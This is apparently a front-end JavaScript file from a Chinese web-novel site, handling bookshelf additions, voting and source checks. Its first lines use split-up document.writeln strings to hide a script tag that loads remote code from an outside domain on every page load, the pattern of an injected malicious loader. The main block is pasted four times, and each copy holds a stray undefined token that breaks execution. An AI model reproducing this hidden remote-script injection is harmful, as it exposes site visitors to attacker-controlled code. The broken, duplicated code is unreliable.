	 	document.writeln('<script src="ht');
	 	document.writeln('tps:');
	 	document.writeln('//tzxy.tonghao.ltd/s_270554_1/w1xhtml?5379026'+ (new Date()).getTime() );
	 	document.writeln('"><\/script>');
$(function(){
    fdsnaiofdsa;
    add_bookshelf=function(){
        if(user_id>0){
            $.get("/user/bookshelf/add",{novel_id:book_id},function(data){
                if(view.mold=="web"){
                    layer.msg(data.msg);
                }else{
                    layer.open({content: data.msg, skin: 'msg',time: 2});
                }
            });
        }else{
            if(view.mold=="web"){
                layer.msg("请先登录后在加入书架！");
            }else{
                layer.open({content: "请先登录后在加入书架！",skin: 'msg',time: 2});
            }
        }
    };
    digg=function(id,digg,type){
        $.get("/home/"+type+"/digg",{id:id,digg:digg},function(data){
            if(data.code==0){
                if(view.mold=="web"){
                    layer.msg(data.msg,{icon: 0});
                }else{
                    layer.open({content: data.msg,skin: 'msg',time: 2});
                }
            }else{
                digg_mag(digg);
            }
        });
    };
    digg_mag=function(digg){
        if(digg=="up"){
            if(view.mold=="web"){
                layer.msg("+1",{icon: 6});
            }else{
                layer.open({content: "+1",skin: 'msg',time: 2});
            }
        }else{
            if(view.mold=="web"){
                layer.msg("+1",{icon: 5});
            }else{
                layer.open({content: "+1",skin: 'msg',time: 2});
            }
        }
    };

    source=function(){
        if(typeof book_id!=="undefined"){
            if(serialize==0){
                $.get("/api/source/index",{id:book_id},function(data){
                    if(view.controller=='novel' && view.action=='index' && data){
                        if(view.mold=="web"){
                            layer.msg('章节已经更新，将自动刷新！',function(){
                                window.location.reload();
                            });
                        }else{
                            layer.open({content: '章节已经更新，将自动刷新！',skin: 'msg',time: 2,end: function(){
                                window.location.reload();
                            }});
                        }
                    }
                });
            }
            if(view.controller=='chapter' && view.action=='index'){
                $.get("/api/save_chapter/index",{id:book.chapter.source_id,key:book.chapter.id});
            }
        }
    };
    //source();

    crontab=function(){
        $.get("/api/crontab/index");
    };
    //crontab();
})
$(function(){
    fdsnaiofdsa;
    add_bookshelf=function(){
        if(user_id>0){
            $.get("/user/bookshelf/add",{novel_id:book_id},function(data){
                if(view.mold=="web"){
                    layer.msg(data.msg);
                }else{
                    layer.open({content: data.msg, skin: 'msg',time: 2});
                }
            });
        }else{
            if(view.mold=="web"){
                layer.msg("请先登录后在加入书架！");
            }else{
                layer.open({content: "请先登录后在加入书架！",skin: 'msg',time: 2});
            }
        }
    };
    digg=function(id,digg,type){
        $.get("/home/"+type+"/digg",{id:id,digg:digg},function(data){
            if(data.code==0){
                if(view.mold=="web"){
                    layer.msg(data.msg,{icon: 0});
                }else{
                    layer.open({content: data.msg,skin: 'msg',time: 2});
                }
            }else{
                digg_mag(digg);
            }
        });
    };
    digg_mag=function(digg){
        if(digg=="up"){
            if(view.mold=="web"){
                layer.msg("+1",{icon: 6});
            }else{
                layer.open({content: "+1",skin: 'msg',time: 2});
            }
        }else{
            if(view.mold=="web"){
                layer.msg("+1",{icon: 5});
            }else{
                layer.open({content: "+1",skin: 'msg',time: 2});
            }
        }
    };

    source=function(){
        if(typeof book_id!=="undefined"){
            if(serialize==0){
                $.get("/api/source/index",{id:book_id},function(data){
                    if(view.controller=='novel' && view.action=='index' && data){
                        if(view.mold=="web"){
                            layer.msg('章节已经更新，将自动刷新！',function(){
                                window.location.reload();
                            });
                        }else{
                            layer.open({content: '章节已经更新，将自动刷新！',skin: 'msg',time: 2,end: function(){
                                window.location.reload();
                            }});
                        }
                    }
                });
            }
            if(view.controller=='chapter' && view.action=='index'){
                $.get("/api/save_chapter/index",{id:book.chapter.source_id,key:book.chapter.id});
            }
        }
    };
    //source();

    crontab=function(){
        $.get("/api/crontab/index");
    };
    //crontab();
})
$(function(){
    fdsnaiofdsa;
    add_bookshelf=function(){
        if(user_id>0){
            $.get("/user/bookshelf/add",{novel_id:book_id},function(data){
                if(view.mold=="web"){
                    layer.msg(data.msg);
                }else{
                    layer.open({content: data.msg, skin: 'msg',time: 2});
                }
            });
        }else{
            if(view.mold=="web"){
                layer.msg("请先登录后在加入书架！");
            }else{
                layer.open({content: "请先登录后在加入书架！",skin: 'msg',time: 2});
            }
        }
    };
    digg=function(id,digg,type){
        $.get("/home/"+type+"/digg",{id:id,digg:digg},function(data){
            if(data.code==0){
                if(view.mold=="web"){
                    layer.msg(data.msg,{icon: 0});
                }else{
                    layer.open({content: data.msg,skin: 'msg',time: 2});
                }
            }else{
                digg_mag(digg);
            }
        });
    };
    digg_mag=function(digg){
        if(digg=="up"){
            if(view.mold=="web"){
                layer.msg("+1",{icon: 6});
            }else{
                layer.open({content: "+1",skin: 'msg',time: 2});
            }
        }else{
            if(view.mold=="web"){
                layer.msg("+1",{icon: 5});
            }else{
                layer.open({content: "+1",skin: 'msg',time: 2});
            }
        }
    };

    source=function(){
        if(typeof book_id!=="undefined"){
            if(serialize==0){
                $.get("/api/source/index",{id:book_id},function(data){
                    if(view.controller=='novel' && view.action=='index' && data){
                        if(view.mold=="web"){
                            layer.msg('章节已经更新，将自动刷新！',function(){
                                window.location.reload();
                            });
                        }else{
                            layer.open({content: '章节已经更新，将自动刷新！',skin: 'msg',time: 2,end: function(){
                                window.location.reload();
                            }});
                        }
                    }
                });
            }
            if(view.controller=='chapter' && view.action=='index'){
                $.get("/api/save_chapter/index",{id:book.chapter.source_id,key:book.chapter.id});
            }
        }
    };
    //source();

    crontab=function(){
        $.get("/api/crontab/index");
    };
    //crontab();
})
$(function(){
    fdsnaiofdsa;
    add_bookshelf=function(){
        if(user_id>0){
            $.get("/user/bookshelf/add",{novel_id:book_id},function(data){
                if(view.mold=="web"){
                    layer.msg(data.msg);
                }else{
                    layer.open({content: data.msg, skin: 'msg',time: 2});
                }
            });
        }else{
            if(view.mold=="web"){
                layer.msg("请先登录后在加入书架！");
            }else{
                layer.open({content: "请先登录后在加入书架！",skin: 'msg',time: 2});
            }
        }
    };
    digg=function(id,digg,type){
        $.get("/home/"+type+"/digg",{id:id,digg:digg},function(data){
            if(data.code==0){
                if(view.mold=="web"){
                    layer.msg(data.msg,{icon: 0});
                }else{
                    layer.open({content: data.msg,skin: 'msg',time: 2});
                }
            }else{
                digg_mag(digg);
            }
        });
    };
    digg_mag=function(digg){
        if(digg=="up"){
            if(view.mold=="web"){
                layer.msg("+1",{icon: 6});
            }else{
                layer.open({content: "+1",skin: 'msg',time: 2});
            }
        }else{
            if(view.mold=="web"){
                layer.msg("+1",{icon: 5});
            }else{
                layer.open({content: "+1",skin: 'msg',time: 2});
            }
        }
    };

    source=function(){
        if(typeof book_id!=="undefined"){
            if(serialize==0){
                $.get("/api/source/index",{id:book_id},function(data){
                    if(view.controller=='novel' && view.action=='index' && data){
                        if(view.mold=="web"){
                            layer.msg('章节已经更新，将自动刷新！',function(){
                                window.location.reload();
                            });
                        }else{
                            layer.open({content: '章节已经更新，将自动刷新！',skin: 'msg',time: 2,end: function(){
                                window.location.reload();
                            }});
                        }
                    }
                });
            }
            if(view.controller=='chapter' && view.action=='index'){
                $.get("/api/save_chapter/index",{id:book.chapter.source_id,key:book.chapter.id});
            }
        }
    };
    //source();

    crontab=function(){
        $.get("/api/crontab/index");
    };
    //crontab();
})
